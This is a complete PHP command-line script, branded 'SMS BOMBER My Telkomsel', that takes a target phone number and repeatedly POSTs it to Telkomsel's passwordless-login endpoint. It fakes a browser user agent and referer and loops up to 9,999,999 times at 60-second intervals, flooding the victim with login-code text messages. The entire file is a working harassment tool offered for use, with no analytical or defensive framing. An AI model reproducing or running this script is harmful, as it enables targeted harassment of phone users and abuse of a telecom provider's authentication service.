<?php
function telkbomb($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n[#008000]Delay: 60 Second\n";
        sleep($wait);
        $x++;
        flush();
    }
}
print "\n\n[#FF0000]SMS BOMBER My Telkomsel\n";
print "[#1E90FF]Unlimited\n";
print "[#008000]Koe Nurf\n\n\n";

echo "Nomor (eg : 628xxx)\nInput : ";
$nomor = trim(fgets(STDIN));
$jumlah = "9999999";
$jeda = "60";
$execute = telkbomb($nomor, $jumlah, $jeda);
print $execute;
?>
